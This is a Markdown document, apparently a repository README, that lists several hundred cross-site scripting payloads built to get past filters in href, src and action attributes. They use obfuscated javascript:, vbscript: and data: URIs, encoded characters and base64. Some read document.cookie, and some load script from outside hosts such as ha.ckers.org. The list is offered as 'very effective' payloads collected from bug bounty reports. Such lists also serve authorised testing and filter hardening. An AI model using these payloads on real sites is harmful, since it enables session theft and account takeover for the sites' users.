# Markdown-XSS
List of XSS Payloads With Filter Bypass

If user input value directly reflected on href or src attribute at time it's worth to try this different XSS payloads. All payload are very effective and most of time it's works, you can use this payload in href, src and action attribute. This all payloads are collected from various sources such as bug bounty write ups and twitter.

## Example :- 
```html
<a href="javascript:alert(/XSS/)">click</a>
<iframe src="javascript:alert(/XSS/)"></iframe>
<form action="javascript:alert(/XSS/)"></form>
```

## Payload List :-
```
javascript:alert(1)

javascript:write(1)

javascript:prompt(1)

javascript:confirm(1)

javascript:alert`1`

javascript:write`1`

javascript:prompt`1`

javascript:confirm`1`

jav&Tab;ascript:alert(1)

jav&Tab;ascript:var a = window.open('');a.alert(window.location.href)

javascript:new%20Function`al\ert\`1\``;

javascript:alert(&quot;XSS&quot;)

javascript:alert(�XSS�)

&Tab;javascript:prompt(1)&Tab;

javaSCRIPT&colon;confirm&lpar;1&rpar;

javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;

vbscript:alert(document.domain)

vbscript:msgbox("XSS")

javascript://%e2%80%a8alert(document.cookie);

javascript://%250alert(1)

javascript:alert&#40/1/&#41

javascript:alert(1)

javascript:alert(1)//https://dqdqdqdqdq.myshopify.com

javascript:x='http://x.c';alert('xss');//

javascript://alert(1)

javas&#x09;cript://www.google.com/%0Aalert(1)

javascript&#58alert(document.domain)

Javascript://%E2%80%A9alert(1)

Javascript://%e2%80%a8alert(1)

jAvAsCrIpT&colon;alert&lpar;/xss-by-tarun/&rpar;

j&#97v&#97script&#x3A;&#97lert(1)

javascript:alert(`cloudfrontbypass`)

j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;

%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)

&#01javascript:alert(1)

javascript&colon;confirm(1)

jav%0Dascript&colon;alert(1)

javascript:alert(document.domain);//http://

javascript%26%63%6f%6c%6f%6e%3balert()

javascript&#58alert(document.domain)

javascript&colon;alert/**/(document.domain)

`javas`+`cript:ale`+`rt%2`+`81%2`+`9`

"jav"+"as&Tab;cr"+"ipt:al"+"er"+"t()"'

%26%237javascrip%26%239t:alert%26lpar;document.domain)

java&Tab;sc&Tab;ript:al&Tab;ert()

javas%26#99;ript:prompt%26#x28document.domain)

&#x3000;javascript:alert('1')

javascript:/a/-alert(1)///////

jAvAsCriPt://&NewLine;\u0061ler&#116(1)

javascript:top['ev'+'al'](self['\x61\x74\x6f\x62'](`YWxlcnQoMSk7`))

JaV' + 'ascRipt:al' + 'ert(' + b; this['src']=a

jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e

jaVasCript:/*-/*`/*\`/*’/*”/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/ — !>\x3csVg/<sVg/oNloAd=alert()//>\x3e

javas&#x09;cript:%0Aalert(1)

javascript:javascript:alert(1)

javascript:javascript:write(1)

javascript:javascript:prompt(1)

javascript:javascript:confirm(1)

javascript:alert(&quot;XSS&quot;)

javascript:alert('XSS')

&Tab;javascript:prompt(1)&Tab;

javaSCRIPT&colon;confirm&lpar;1&rpar;

javascript&colon;confirm(1)

&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)

data&colon;,window.open('https://www.google.com/')

javascript:\u0061lert&#x28;1&#x29;

javascript&#58;alert(1)

javascript:alert&#x28;1&#x29;

javaSCRIPT&colon;alert(1)

javascript%3Aalert%281%29

javascript%3Aalert%601%60

javascript&#x3A;alert&lpar;document&period;cookie&rpar;

javascript:&#13; javascript:prompt(1)

javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;

jAvAsCrIpT&colon;alert&lpar;1&rpar;

javascript&colon;alert&lpar;document&period;cookie&rpar;

0;javascript&colon;alert(1)

javascript&colon;\u0061&#x6C;&#101%72t(1)

j&#97v&#97script&#x3A;&#97lert(1)

�javascript:alert(�XSS�)�

vbscript&#058;msgbox(\"XSS\")

mocha&#58;&#91;code&#93;\

livescript&#058;&#91;code&#93;\

javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;alert('XSS');\

javas&lt;!-- --&gt;cript&#58;alert('XSS')\

http&#58;//www&#46;gohttp&#58;//www&#46;google&#46;com/ogle&#46;com/\

javascript&#058;document&#46;location='http&#58;//www&#46;google&#46;com/'\

http&#58;//www&#46;google&#46;com&#46;/\

http&#58;//google&#58;ha&#46;ckers&#46;org\

http&#58;//ha&#46;ckers&#46;org@google\

http&#58;//0102&#46;0146&#46;0007&#46;00000223/\

http&#58;//0x42&#46;0x0000066&#46;0x7&#46;0x93/\

jav&#x0D;ascript&#058;alert('XSS');\

jav&#x0A;ascript&#058;alert('XSS');\

jav&#x09;ascript&#058;alert('XSS');\

javascript&#058;alert('XSS')&gt;

javascript&#058;alert(&quot;XSS&quot;)

JaVaScRiPt&#058;alert('XSS')

javascript&#058;alert('XSS')

javascript&#058;alert('XSS');\

http&#58;//ha&#46;ckers&#46;org/xss&#46;js\

JaVaScRiPt:alert('XSS')

\ja\vasc\ript:alert("XSS")

javas\x00cript:javascript:alert(1)

javas\x07cript:javascript:alert(1)

javas\x0Dcript:javascript:alert(1)

javas\x0Acript:javascript:alert(1)

javas\x08cript:javascript:alert(1)

javas\x02cript:javascript:alert(1)

javas\x03cript:javascript:alert(1)

javas\x04cript:javascript:alert(1)

javas\x01cript:javascript:alert(1)

javas\x05cript:javascript:alert(1)

javas\x0Bcript:javascript:alert(1)

javas\x09cript:javascript:alert(1)

javas\x06cript:javascript:alert(1)

javas\x0Ccript:javascript:alert(1)

/* *\x2A/javascript:alert(1)// */

/* *\x00/javascript:alert(1)// */

javascript\x3Ajavascript:alert(1)

\x0Bjavascript:javascript:alert(1)

\x0Bjavascript:javascript:alert(1)

\x0Fjavascript:javascript:alert(1)

\xC2\xA0javascript:javascript:alert(1)

\x05javascript:javascript:alert(1)

\xE1\xA0\x8Ejavascript:javascript:alert(1)

\x18javascript:javascript:alert(1)

\x11javascript:javascript:alert(1)

\xE2\x80\x88javascript:javascript:alert(1)

\xE2\x80\x89javascript:javascript:alert(1)

\xE2\x80\x80javascript:javascript:alert(1)

\x17javascript:javascript:alert(1)

\x03javascript:javascript:alert(1)

\x0Ejavascript:javascript:alert(1)

\x1Ajavascript:javascript:alert(1)

\x00javascript:javascript:alert(1)

\x10javascript:javascript:alert(1)

\xE2\x80\x82javascript:javascript:alert(1)

\x20javascript:javascript:alert(1)

\x13javascript:javascript:alert(1)

\x09javascript:javascript:alert(1)

\xE2\x80\x8Ajavascript:javascript:alert(1)

\x14javascript:javascript:alert(1)

\x19javascript:javascript:alert(1)

\xE2\x80\xAFjavascript:javascript:alert(1)

\x1Fjavascript:javascript:alert(1)

\xE2\x80\x81javascript:javascript:alert(1)

\x1Djavascript:javascript:alert(1)

\xE2\x80\x87javascript:javascript:alert(1)

\x07javascript:javascript:alert(1)

\xE1\x9A\x80javascript:javascript:alert(1)

\xE2\x80\x83javascript:javascript:alert(1)

\x04javascript:javascript:alert(1)

\x01javascript:javascript:alert(1)

\x08javascript:javascript:alert(1)

\xE2\x80\x84javascript:javascript:alert(1)

\xE2\x80\x86javascript:javascript:alert(1)

\xE3\x80\x80javascript:javascript:alert(1)

\x12javascript:javascript:alert(1)

\x0Djavascript:javascript:alert(1)

\x0Ajavascript:javascript:alert(1)

\x0Cjavascript:javascript:alert(1)

\x15javascript:javascript:alert(1)

\xE2\x80\xA8javascript:javascript:alert(1)

\x16javascript:javascript:alert(1)

\x02javascript:javascript:alert(1)

\x1Bjavascript:javascript:alert(1)

\x06javascript:javascript:alert(1)

\xE2\x80\xA9javascript:javascript:alert(1)

\xE2\x80\x85javascript:javascript:alert(1)

\x1Ejavascript:javascript:alert(1)

\xE2\x81\x9Fjavascript:javascript:alert(1)

\x1Cjavascript:javascript:alert(1)

javascript\x00:javascript:alert(1)

javascript\x3A:javascript:alert(1)

javascript\x09:javascript:alert(1)

javascript\x0D:javascript:alert(1)

javascript\x0A:javascript:alert(1)

\x3Bjavascript:alert(1)

\x0Djavascript:alert(1)

\xEF\xBB\xBFjavascript:alert(1)

\xE2\x80\x81javascript:alert(1)

\xE2\x80\x84javascript:alert(1)

\xE3\x80\x80javascript:alert(1)

\x09javascript:alert(1)

\xE2\x80\x89javascript:alert(1)

\xE2\x80\x85javascript:alert(1)

\xE2\x80\x88javascript:alert(1)

\x00javascript:alert(1)

\xE2\x80\xA8javascript:alert(1)

\xE2\x80\x8Ajavascript:alert(1)

\xE1\x9A\x80javascript:alert(1)

\x0Cjavascript:alert(1)

\x2Bjavascript:alert(1)

\xF0\x90\x96\x9Ajavascript:alert(1)

-javascript:alert(1)

\x0Ajavascript:alert(1)

\xE2\x80\xAFjavascript:alert(1)

\x7Ejavascript:alert(1)

\xE2\x80\x87javascript:alert(1)

\xE2\x81\x9Fjavascript:alert(1)

\xE2\x80\xA9javascript:alert(1)

\xC2\x85javascript:alert(1)

\xEF\xBF\xAEjavascript:alert(1)

\xE2\x80\x83javascript:alert(1)

\xE2\x80\x8Bjavascript:alert(1)

\xEF\xBF\xBEjavascript:alert(1)

\xE2\x80\x80javascript:alert(1)

\x21javascript:alert(1)

\xE2\x80\x82javascript:alert(1)

\xE2\x80\x86javascript:alert(1)

\xE1\xA0\x8Ejavascript:alert(1)

\x0Bjavascript:alert(1)

\x20javascript:alert(1)

\xC2\xA0javascript:alert(1)

\x0Bjavascript:alert(1)\x0B

\x22javascript:alert(1)\x22

\x09javascript:alert(1)\x09

\x27javascript:alert(1)\x27

\x0Ajavascript:alert(1)\x0A

\x0Cjavascript:alert(1)\x0C

\x0Djavascript:alert(1)\x0D

\x60javascript:alert(1)\x60

\x20javascript:alert(1)\x20

http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D

&Tab;javascript:prompt(1)&Tab;

javascript&#x3A;alert&lpar;document&period;cookie&rpar;javascript&#x3A;alert&lpar;document&period;cookie&rpar;

javascript:&#13; javascript:prompt(1)

javascript:&#13; javascript:prompt(1)

jAvAsCrIpT&colon;alert&lpar;1&rpar;

javascript&colon;alert&lpar;document&period;cookie&rpar;

data:text/javascript,alert(1)

javascript:document.vulnerable=true;

data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K

data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&
#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203

data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+

data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv 
MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw 
IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==

data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E

data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203

&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;

&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041

&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29

&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)

data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)

j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29

j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29

%6a%61%76%61%73%63%72%69%70%74%3a%61%6c%65%72%74%60%31%60

%25%36%61%25%36%31%25%37%36%25%36%31%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%61%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34%25%36%30%25%33%31%25%36%30

%6a%61%76%61%73%63%72%69%70%74%3a%61%6c%65%72%74%28%31%29

%25%36%61%25%36%31%25%37%36%25%36%31%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%61%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34%25%32%38%25%33%31%25%32%39

amF2YXNjcmlwdDphbGVydCgxKQ==

&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;

${alert(1)}

[XSS](.alert(1);)
```

